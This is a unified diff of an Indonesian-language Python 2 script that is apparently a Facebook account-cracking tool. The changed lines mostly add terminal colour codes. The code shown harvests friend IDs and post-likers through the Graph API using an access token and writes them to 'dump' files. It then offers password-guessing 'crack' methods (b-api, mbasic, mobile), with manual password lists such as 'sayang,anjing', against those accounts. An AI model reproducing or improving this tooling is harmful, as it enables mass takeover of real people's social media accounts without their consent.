@@ -129,8 +129,8 @@ def publik(romz,headers=header):
         os.mkdir('dump')
     except:pass
     try:
-    	print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump daftar teman sendiri "%(P,M,P,H,P))
-        idt = raw_input(' [*] Target id : %s'%(K))
+    	print ("\n%s [%s!%s] \x1b[1;93mKetik '%sme%s' \x1b[1;93mjika ingin dump daftar teman sendiri "%(P,M,P,H,P))
+        idt = raw_input(' \x1b[1;92m[*] Target id : %s'%(K))
         gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
         nm = json.loads(gas.text)
         file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
@@ -140,15 +140,15 @@ def publik(romz,headers=header):
         for a in z['friends']['data']:
             id.append(a['id'] + '<=>' + a['name'])
             bff.write(a['id'] + '<=>' + a['name'] + '\n')
-            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
+            print '\r%s \x1b[1;93m[*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
             sys.stdout.flush();jeda(0.0050)
         bff.close()
-        print ('\n\n %s[%s√%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
-        print ('%s [%s√%s] File dump tersimpan :%s %s '%(P,H,P,H,file))
-        raw_input('\n%s [ %senter %s] '%(P,K,P))
+        print ('\n\n %s[%s√%s] \x1b[1;93mSucces dump id dari %s%s'%(P,H,P,H,nm['name']))
+        print ('%s [%s√%s] \x1b[1;93mFile dump tersimpan :%s %s '%(P,H,P,H,file))
+        raw_input('\n%s \x1b[1;92m[ %s\x1b[1;93mKEMBALI %s\x1b[1;92m] '%(P,K,P))
         menu()
     except Exception as e:
-        exit('\n %s[!] gagal dump id'%(P))
+        exit('\n %s\x1b[1;91m[!] gagal dump id'%(P))
 # DUMP FOLLOWERS
 def followers(romz,headers=header):
     try:
@@ -182,9 +182,9 @@ def postingan(romz,headers=header):
         os.mkdir('dump')
     except:pass
     try:
-    	print ("\n%s [%s!%s] Perlu di ingat postingan wajib publik "%(P,M,P))
-        idt = raw_input(' [*] Id post   : %s'%(K))
-        simpan = raw_input(' %s[?] Nama file : %s'%(P,K))
+    	print ("\n%s [%s!%s] \x1b[1;93mPerlu di ingat postingan wajib publik "%(P,M,P))
+        idt = raw_input(' [*] \x1b[1;93mId post   : %s'%(K))
+        simpan = raw_input(' %s[?] \x1b[1;93mNama file : %s'%(P,K))
         r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,romz))
         id = []
         z = json.loads(r.text)
@@ -193,15 +193,15 @@ def postingan(romz,headers=header):
         for a in z['data']:
             id.append(a['id'] + '<=>' + a['name'])
             bff.write(a['id'] + '<=>' + a['name'] + '\n')
-            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
+            print '\r%s [*] \x1b[1;93mmengumpulkan id :%s %s ' % (P,H,str(len(id))),
             sys.stdout.flush();jeda(0.0050)
         bff.close()
-        print ('\n\n %s[%s√%s] Succes dump id postingan '%(P,H,P))
-        print ('%s [%s√%s] File dump tersimpan :%s %s '%(P,H,P,H,file))
-        raw_input('\n%s [ %senter %s] '%(P,K,P))
+        print ('\n\n %s[%s√%s] \x1b[1;93mSucces dump id postingan '%(P,H,P))
+        print ('%s [%s√%s] \x1b[1;93mFile dump tersimpan :%s %s '%(P,H,P,H,file))
+        raw_input('\n%s \x1b[1;92m[ %s\x1b[1;93mKEMBALI %s\x1b[1;92m] '%(P,K,P))
         menu()
     except Exception as e:
-        exit('\n %s[!] gagal dump id'%(P))
+        exit('\n %s[!] \x1b[1;91mgagal dump id'%(P))
 # START CRACK
 class ngentod:
 
@@ -209,24 +209,24 @@ class ngentod:
         self.id = []
     def romiy(self):
         try:
-            self.apk = raw_input('\n %s[?] file dump :%s '%(P,K))
+            self.apk = raw_input('\n %s[?] \x1b[1;93mfile dump :%s '%(P,K))
             self.id = open(self.apk).read().splitlines()
-            print '%s [%s*%s] jumlah id : %s%s' %(P,K,P,H,len(self.id))
+            print '%s [%s*%s] \x1b[1;93mjumlah id : %s%s' %(P,K,P,H,len(self.id))
         except:
-            print '\n%s [!] File dump tidak ada, dump id dulu kentod'%(M)
-            raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
-        unikers = raw_input('%s [?] ingin gunakan password manual? [y/t] :%s '%(P,K))
+            print '\n%s [!] \x1b[1;93mKemungkinan anda blum dump id'%(M)
+            raw_input('\n%s \x1b[1;92m[ %s\x1b[1;93mKEMBALI %s\x1b[1;92m] '%(P,K,P));menu()
+        unikers = raw_input('%s [?] \x1b[1;93mingin gunakan password manual? \x1b[1;92m[\x1b[1;93my\x1b[1;97m/\x1b[1;92mt\x1b[1;93m] :%s '%(P,K))
         if unikers in ('Y', 'y'):
-            print '\n %s[%s!%s] cth : %ssayang,anjing%s gunakan , (koma) untuk pemisah '%(P,M,P,H,P)
+            print '\n %s[%s!%s] \x1b[1;93mcth : %s\x1b[1;93msayang,anjing%s \x1b[1;93mgunakan , (koma) untuk pemisah '%(P,M,P,H,P)
             while True:
-                pwx = raw_input(' %s[?] set password :%s '%(P,K))
+                pwx = raw_input(' %s[?] \x1b[1;93mset password :%s '%(P,K))
                 if pwx == '':
-                    print '\n %s[!] jangan kosong '%(M)
+                    print '\n %s[!] \x1b[1;93mjangan kosong '%(M)
                 elif len(pwx)<=5:
-                    print '\n %s[!] password minimal 6 karakter'%(M)
+                    print '\n %s[!] \x1b[1;93m\x1b[1;93mpassword minimal 6 karakter'%(M)
                 else:
                     def zona(zafi_=None): 
-                        ind = raw_input('\n %s[?] methode : %s'%(P,K))
+                        ind = raw_input('\n %s[?] \x1b[1;93mmethode : %s'%(P,K))
                         if ind == '':
                             print("%s [!] Isi yang benar kentod "%(M));self.zona()
                         elif ind in ('1', '01'):
@@ -264,17 +264,17 @@ class ngentod:
                             os.remove(self.apk);exit()
                         else:
                             print ('\n %s[!] isi yang benar kentod'%(M));zona()
-                    print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
-                    print ' [%s01%s] methode b-api (crack cepat)'%(K,P)
-                    print ' [%s02%s] methode mbasic (crack lambat)'%(K,P)
-                    print ' [%s03%s] methode mobile (crack sangat lambat) '%(K,P)
+                    print '\n%s [ \x1b[1;96mpilih methode crack - silahkan coba satu² ]\n'%(P)
+                    print ' [%s01%s] \x1b[1;93mmethode b-api (crack cepat)'%(K,P)
+                    print ' [%s02%s] \x1b[1;92mmethode mbasic (crack lambat)'%(K,P)
+                    print ' [%s03%s] \x1b[1;97mmethode mobile (crack sangat lambat) '%(K,P)
                     zona(pwx.split(','))
                     break
         elif unikers in ('T', 't'):
-            print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
-            print ' [%s01%s] methode b-api (crack cepat)'%(K,P)
-            print ' [%s02%s] methode mbasic (crack lambat)'%(K,P)
-            print ' [%s03%s] methode mobile (crack sangat lambat) '%(K,P)
+            print '\n%s [ \x1b[1;96mpilih methode crack - silahkan coba satu² ]\n'%(P)
+            print ' [%s01%s] \x1b[1;93mmethode b-api (crack cepat)'%(K,P)
+            print ' [%s02%s] \x1b[1;92mmethode mbasic (crack lambat)'%(K,P)
+            print ' [%s03%s] \x1b[1;93mmethode mobile (crack sangat lambat) '%(K,P)
             self.langsung()
         else:
             print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
@@ -582,30 +582,30 @@ def crack2(user, pwx):
 None
 # GANTI USER AGENT
 def useragent():
-	print ("\n%s [%s01%s] Ganti user agent "%(P,K,P))
-	print (" [%s02%s] Cek user agent "%(K,P))
-	print (" [%s00%s] Kembali "%(M,P))
+	print ("\n%s [%s01%s] \x1b[1;96mGanti user agent "%(P,K,P))
+	print (" [%s02%s] \x1b[1;96mCek user agent "%(K,P))
+	print (" [%s00%s] \x1b[1;91mKembali "%(M,P))
 	uas()
 def uas():
-    u = raw_input('\n%s [?] pilih :%s '%(P,K))
+    u = raw_input('\n%s [?] \x1b[1;93mpilih :%s '%(P,K))
     if u == '':
-        print("%s [!] Isi yang benar kentod "%(M));jeda(2);uas()
+        print("%s [!] \x1b[1;91mIsi yang benar kentod "%(M));jeda(2);uas()
     elif u in("1","01"):
-    	print (" %s[%s*%s] ketik %sMy user agent%s di browser google chrome\n [%s*%s] untuk gunakan user agent anda sendiri"%(P,K,P,H,P,K,P))
-    	print (" [%s*%s] ketik %sdefault%s untuk gunakan user agent bawaan tools"%(K,P,H,P))
+    	print (" %s[%s*%s] \x1b[1;93mketik %s\x1b[1;96mMy user agent%s \x1b[1;93mdi browser google chrome\n [%s*%s] \x1b[1;93muntuk gunakan user agent anda sendiri"%(P,K,P,H,P,K,P))
+    	print (" [%s*%s] \x1b[1;93mketik %s\x1b[1;96mdefault%s \x1b[1;93muntuk gunakan user agent bawaan tools"%(K,P,H,P))
     	try:
-    	    ua = raw_input("%s [?] user agent : %s"%(P,K))
+    	    ua = raw_input("%s [?] \x1b[1;93muser agent : %s"%(P,K))
             if ua in(""):
             	print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
             elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
-            	jalan("%s [!]  Anda akan di arahkan ke browser "%(H));jeda(2)
+            	jalan("%s [!] \x1b[1;96m Anda akan di arahkan ke browser "%(H));jeda(2)
             	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent()
             elif ua in("default","Default","DEFAULT"):
                 ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
                 open("data/ua.txt","w").write(ua_)
-                print ("\n%s [√] menggunakan user agent bawaan"%(H));jeda(2);menu()
+                print ("\n%s [√] \x1b[1;96mmenggunakan user agent bawaan"%(H));jeda(2);menu()
             open("data/ua.txt","w").write(ua);jeda(2)
-            print ("\n%s [√] berhasil mengganti user agent"%(H));jeda(2);menu()
+            print ("\n%s [√] \x1b[1;92mberhasil mengganti user agent"%(H));jeda(2);menu()
         except KeyboardInterrupt as er:
 			exit ("\x1b[1;91m [!] "+er) 
     elif u in("2","02"):
@@ -616,7 +616,7 @@ def uas():
     elif u in("0","00"):
     	menu()
     else:
-        print("%s [!] Isi yang benar kentod "%(M));jeda(2);uas()
+        print("%s [!] \x1b[1;91mIsi yang benar kentod "%(M));jeda(2);uas()
 # MENU INI AJG
 def menu():
     os.system('clear')
